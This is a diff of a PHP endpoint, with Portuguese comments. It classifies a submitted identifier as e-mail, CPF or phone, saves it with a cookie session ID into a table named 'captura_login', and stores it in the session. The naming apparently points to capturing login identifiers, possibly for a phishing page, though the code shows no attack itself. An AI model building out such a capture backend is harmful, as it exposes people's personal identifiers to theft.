@@ -1,17 +1,16 @@
 <?php
-// api_salvar_identificador.php
+// ADIÇÃO 1: Iniciar a sessão. Essencial para usar a variável $_SESSION.
+session_start();
 
 // Define o cabeçalho de resposta como JSON
 header('Content-Type: application/json');
 
 // --- PASSO 1: LER O COOKIE DE SESSÃO ---
 if (!isset($_COOKIE['identificador_cliente'])) {
-    // Se por algum motivo o cookie não foi criado, retorna um erro.
     echo json_encode(['success' => false, 'error' => 'ID de sessão não encontrado. Limpe os cookies e tente novamente.']);
     exit;
 }
 $session_id = $_COOKIE['identificador_cliente'];
-
 
 // Inclui o coração do projeto para ter acesso ao banco de dados ($pdo)
 require 'db.php';
@@ -27,19 +26,34 @@ if (!isset($data['identificador']) || empty(trim($data['identificador']))) {
 
 $identificador = trim($data['identificador']);
 
+// ADIÇÃO 2: Lógica para determinar o tipo de identificador
+$tipo_identificador = 'Indefinido';
+$apenasNumeros = preg_replace('/\D/', '', $identificador);
+
+if (filter_var($identificador, FILTER_VALIDATE_EMAIL)) {
+    $tipo_identificador = 'E-mail';
+} elseif (strlen($apenasNumeros) == 11) {
+    // Para simplificar, consideramos 11 dígitos como CPF para exibição.
+    $tipo_identificador = 'CPF';
+} elseif (strlen($apenasNumeros) == 10) {
+    $tipo_identificador = 'Telefone';
+}
+
+
 try {
-    // --- PASSO 2: AJUSTAR A QUERY SQL ---
-    // A query agora inclui a coluna "session_id"
+    // --- PASSO 2: AJUSTAR A QUERY SQL --- (Seu código aqui já está correto)
     $stmt = $pdo->prepare(
         "INSERT INTO captura_login (session_id, identificador) VALUES (?, ?)"
     );
     
-    // --- PASSO 3: EXECUTAR A QUERY ---
-    // Passamos os dois parâmetros na ordem correta: session_id e depois o identificador
+    // --- PASSO 3: EXECUTAR A QUERY --- (Seu código aqui já está correto)
     $stmt->execute([$session_id, $identificador]);
     
-    // Pega o ID da última inserção
     $lastId = $pdo->lastInsertId();
+    
+    // ADIÇÃO 3: Salvar os dados na sessão antes de enviar a resposta ao frontend
+    $_SESSION['identificador_usuario'] = $identificador;
+    $_SESSION['tipo_identificador'] = $tipo_identificador;
 
     // Retorna uma resposta de sucesso com o ID
     echo json_encode(['success' => true, 'id' => $lastId]);
